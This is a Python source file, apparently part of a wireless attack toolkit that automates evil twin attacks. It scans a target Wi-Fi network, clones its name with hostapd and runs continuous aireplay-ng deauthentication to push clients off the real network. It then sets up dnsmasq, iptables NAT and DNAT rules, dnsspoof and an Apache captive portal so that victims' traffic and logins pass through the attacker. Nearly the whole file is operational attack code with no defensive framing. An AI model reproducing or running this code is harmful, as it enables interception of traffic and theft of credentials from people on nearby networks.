import os
import signal
import subprocess
import time
import re
import keyboard
import glob

requirements = ['hostapd',
                'dnsmasq',
                'dhclient',
                'airmon-ng']

from terminal import (clear,
                      run_command,
                      run_command_print_output,
                      popen_command,
                      popen_command_new_terminal,
                      check_output)

from interface_management import (change_interface,
                                  is_interface_monitor,
                                  switch_interface_to_monitor_mode,
                                  switch_interface_to_managed_mode,
                                  switch_interface_channel)

from color import (red,
                   green,
                   purple,
                   yellow,
                   blue,
                   magenta,
                   cyan,
                   white
                   )


def get_bssid_and_station_from_ap(interface, target_ap):
    print(f'Gathering Information on {target_ap}')
    output, error = popen_command(f'airodump-ng -N {target_ap} {interface}', killtime=2)
    if 'Failed initializing wireless card(s)' in output:
        print(f'Scan was not successful due to {green(interface)} being {red("DOWN")}')
        print(f'{red("AIRODUMP-NG STDOUT ::")}\n{red(str(output))}')
        return
    elif target_ap not in output:
        print(
            f'Scan was successful but {green(target_ap)} is not found.')
        if input('RETRY? Y/N').lower().split() == 'y':
            return get_bssid_and_station_from_ap(interface, target_ap)
    else:
        for column in output.split('\n'):
            row = column.split()
            if row[-2] and row[1]:
                if row[-2] == target_ap and len(row[1]) == 17:
                    return row[1], row[6]


def create_file_in_tmp(file, content):
    """
    :param file: full name of the file to be created with extension
        ex : dnsmasq.config
    :param content: list of string
        ex : content = [
            'text',
            'text',
            'text',
            ]
    :return:
    """
    location = f'/tmp/{file}'
    with open(location, 'w') as new_file:
        for line in content:
            new_file.write(line + "\n")
    print(f'{green(file)} created at {green(location)}')


def apache2(interface):
    print(magenta('running apache2'))

    html_location = './captive_portal_html/{}'
    html_destination = '/var/www/html/{}'

    config_location = './captive_portal_html/{}'
    config_destination = '/etc/apache2/sites-enabled/{}'

    # run_command_print_output(f"cp -r {html_location.format('temp')} {html_destination.format('temp')}")
    # run_command_print_output(f"cp -r {html_location.format('android')} {html_destination.format('android')}")
    # run_command(f"cp {config_location.format('android.config')} {config_destination.format('android.config')}")

    # run_command(f"cp {config_location.format('000-default.conf')} /etc/apache2/sites-available/temp.conf")
    run_command_print_output(
        f"cp {config_location.format('000-default.conf')} /etc/apache2/sites-available/000-default.conf")

    run_command_print_output('a2enmode rewrite')
    run_command_print_output('systemctl restart apache2')


def dnsmasq(interface, internet_facing_interface=None, captive_portal=False):
    conf_content = [
        f'interface={interface}',
        f"log-queries",
        f"log-dhcp",
        f'dhcp-range=192.168.10.1,192.168.10.250,12h',
        f'dhcp-option=3,192.168.10.1',
        f'dhcp-option=6,192.168.10.1',
        f'listen-address=127.0.0.1',
        f'server=8.8.8.8',
        # f'address=/#/192.168.10.1' this line here made the issue with having no internet on rogueAP
    ]
    if captive_portal:
        print(magenta('running dnsmasq config with captive_portal'))
        conf_content = [
            f'interface={interface}',
            "log-queries",
            "log-dhcp",
            "dhcp-range=192.168.10.10,192.168.10.250,255.255.255.0,12h",
            "dhcp-option=3,192.168.10.1",  # Default Gateway
            "dhcp-option=6,192.168.10.1",  # DNS Server
            "listen-address=127.0.0.1,192.168.10.1",
            "server=8.8.8.8",  # Upstream DNS
            f"except-interface={internet_facing_interface}",
            "address=/#/192.168.10.1"  # Redirect all domains to the captive portal IP
        ]
    create_file_in_tmp('dnsmasq.conf', conf_content)
    popen_command_new_terminal('dnsmasq -C /tmp/dnsmasq.conf -d')


def hostapd(interface, target_ap, channel, captive_portal=False):
    conf_content = [
        f'interface={interface}',
        f'driver=nl80211',
        f'hw_mode=g',
        f'ssid={target_ap}',
        f'channel={channel}',
    ]
    if captive_portal:
        print(magenta('running hostapd config with captive_portal'))
        conf_content = [
            f'interface={interface}',
            f'driver=nl80211',
            f'ssid={target_ap}captive',
            f'hw_mode=g',
            f'channel={channel}',
            f'wmm_enabled=0',
            f'macaddr_acl=0',
            f'auth_algs=1',
            f'ignore_broadcast_ssid=0',

        ]
    create_file_in_tmp('hostapd.conf', conf_content)
    popen_command_new_terminal(f'hostapd /tmp/hostapd.conf')


def forwarding(interface, internet_facing_interface, captive_portal=False):
    run_command_print_output('airmon-ng check kill')
    switch_interface_to_monitor_mode(interface)
    run_command_print_output('echo 1 > /proc/sys/net/ipv4/ip_forward')
    run_command_print_output(f'ip addr add 192.168.10.1/24 dev {interface}')
    run_command_print_output(f'iptables -t nat -A POSTROUTING -o {internet_facing_interface} -j MASQUERADE')
    run_command_print_output(f'iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT')
    run_command_print_output(f'iptables -A FORWARD -i {interface} -o {internet_facing_interface} -j ACCEPT')

    if captive_portal:
        print(magenta('running forwarding with captive_portal'))
        # iptables rules
        run_command_print_output(
            f'iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination 192.168.10.1:80')
        # run_command(f'iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j DNAT --to-destination 192.168.10.1:443')
        run_command_print_output(f'iptables -A FORWARD -p tcp -d 192.168.10.1 --dport 80 -j ACCEPT')
        run_command_print_output(f'iptables -t nat -A POSTROUTING -j MASQUERADE')


def rogue_ap(interface, internet_facing_interface, target_ap, channel, Called_from_EvilTwin=False,
             captive_portal=False):
    if captive_portal:
        print(magenta('running rogue_ap with captive_portal'))
        forwarding(interface, internet_facing_interface,captive_portal=True)
        hostapd(interface, target_ap, channel, captive_portal=True)
        dnsmasq(interface, internet_facing_interface=internet_facing_interface, captive_portal=True)
    else:
        print(magenta('running rogue_ap without captive_portal'))
        forwarding(interface, internet_facing_interface)
        dnsmasq(interface)
        hostapd(interface, target_ap, channel)
    if Called_from_EvilTwin:
        return
    else:
        input(f'\n\n{green("Press Enter to Quit Rogue AP : ")}')
        close(interface, internet_facing_interface)


def aireplay(interface, bssid, channel):
    switch_interface_channel(interface, channel)
    popen_command_new_terminal(f'aireplay-ng --deauth 0 -a {bssid} --ignore-negative-one {interface}')


def create_new_interface(interface):
    """
    Issue 1
    :param interface:
    :return:
    """
    monitor_interface = interface + 'clone'  # monitor interface from main interface to be used in aireplay-ng since we cant use wlan0 for both hostapds and aireplay at the same time
    output = check_output('iw dev')
    lines = output.split('\n')
    phy = '12'
    for i, line in enumerate(lines):
        if f"Interface {interface}" in line:
            phy_line = lines[i - 1]
            phy = phy_line.strip().split()[0]
            phy = phy.replace("#", "")
    run_command(f'iw {phy} interface add {monitor_interface} type monitor')
    run_command(f'ip link set {monitor_interface} up')
    return monitor_interface


def evil_twin(interface, internet_facing_interface, target_ap):
    """

    :param interface:
    :param internet_facing_interface:
    :param target_ap:
    :return:
    """
    # gather information on target
    bssid, channel = get_bssid_and_station_from_ap(interface, target_ap)
    # create a monitor interface from wlan0 to be used in aireplay
    monitor_interface = create_new_interface(interface)
    # create access point for evil twin
    rogue_ap(interface, internet_facing_interface, target_ap, channel, Called_from_EvilTwin=True)
    input(f'\n\n{green("Press Enter to Quit Evil Twin : ")}')
    clear()
    print(
        f"RULES/CONFIGURATIONS ARE BEING REVERTED. {red('DO NOT CANCEL')} THIS PROCESS OR YOUR NETWORK CONNECTION MAY NOT WORK AS EXPECTED")
    close(interface, internet_facing_interface, monitor_interface=monitor_interface)


def evil_twin_deauth(interface, internet_facing_interface, target_ap):
    """

    :param interface:
    :param internet_facing_interface:
    :param target_ap:
    :return:
    """
    # gather information on target
    bssid, channel = get_bssid_and_station_from_ap(interface, target_ap)
    # create a monitor interface from wlan0 to be used in aireplay
    monitor_interface = create_new_interface(interface)
    # deauth target_ap
    aireplay(monitor_interface, bssid, channel)
    # create access point for evil twin
    rogue_ap(interface, internet_facing_interface, target_ap, channel, Called_from_EvilTwin=True)
    # wait for input to quit and clear up all rules and configuration
    input(f'\n\n{green("Press Enter to Quit Evil Twin (deauth) : ")}')
    clear()
    print(
        f"RULES/CONFIGURATIONS ARE BEING REVERTED. {red('DO NOT CANCEL')} THIS PROCESS OR YOUR NETWORK CONNECTION MAY NOT WORK AS EXPECTED")
    close(interface, internet_facing_interface, monitor_interface=monitor_interface)


def evil_twin_captive_portal(interface, internet_facing_interface, target_ap):
    # gather information on target
    bssid, channel = get_bssid_and_station_from_ap(interface, target_ap)
    # create a monitor interface from wlan0 to be used in aireplay
    monitor_interface = create_new_interface(interface)
    # deauth target_ap
    aireplay(monitor_interface, bssid, channel)
    # start web server
    apache2(interface)
    # create access point for evil twin with captive portal
    rogue_ap(interface, internet_facing_interface, target_ap, channel, Called_from_EvilTwin=True, captive_portal=True)
    # redirect all traffic to interface
    run_command_print_output(f'dnsspoof -i {interface}')
    input(f'\n\n{green("Press Enter to Quit Evil Twin (captive portal) : ")}')
    clear()
    print(
        f"RULES/CONFIGURATIONS ARE BEING REVERTED. {red('DO NOT CANCEL')} THIS PROCESS OR YOUR NETWORK CONNECTION MAY NOT WORK AS EXPECTED")
    close(interface, internet_facing_interface, monitor_interface)


def close(interface, internet_facing_interface, monitor_interface=None, called_from_evil_twin=False,
          captive_portal=False):
    if called_from_evil_twin:
        run_command_print_output('killall aireplay-ng')
    run_command_print_output('killall hostapd')
    run_command_print_output('killall dnsmasq')
    if monitor_interface:
        run_command_print_output(f'iw {monitor_interface} del')
    run_command_print_output(f'dhclient -r {interface}')  # resets interface ip to original
    # remove forwarding rules
    run_command_print_output("iptables --flush")
    run_command_print_output("iptables --flush -t nat")
    run_command_print_output("iptables --delete-chain")
    run_command_print_output("iptables --table nat --delete-chain")
    run_command_print_output('echo 0 > /proc/sys/net/ipv4/ip_forward')
    run_command_print_output(f'iptables -t nat -D POSTROUTING -o {internet_facing_interface} -j MASQUERADE')
    run_command_print_output(f'iptables -D FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT')
    run_command_print_output(f'iptables -D FORWARD -i {interface} -o {internet_facing_interface} -j ACCEPT')
    run_command_print_output(f'killall dhclient')
    run_command_print_output(f'systemctl restart NetworkManager')
    run_command_print_output(f'systemctl stop apache2')
    if captive_portal:
        # remove apache() rules
        # Delete the PREROUTING rule for port 80:
        run_command_print_output(
            f'iptables -t nat -D PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination 192.168.10.1:80')
        # Delete the PREROUTING rule for port 443:
        run_command_print_output(
            f'iptables -t nat -D PREROUTING -i {interface} -p tcp --dport 443 -j DNAT --to-destination 192.168.10.1:443')
        # Delete the FORWARD rule for port 80:
        run_command_print_output(f'iptables -D FORWARD -p tcp -d 192.168.10.1 --dport 80 -j ACCEPT')
    run_command_print_output('iptables -t nat -L POSTROUTING --line-numbers')
    ## in case if something is wrong flush all iptable rules with
    """
        iptables -F
        iptables -t nat -F
        iptables -X
        iptables -t nat -X

    """
    clear()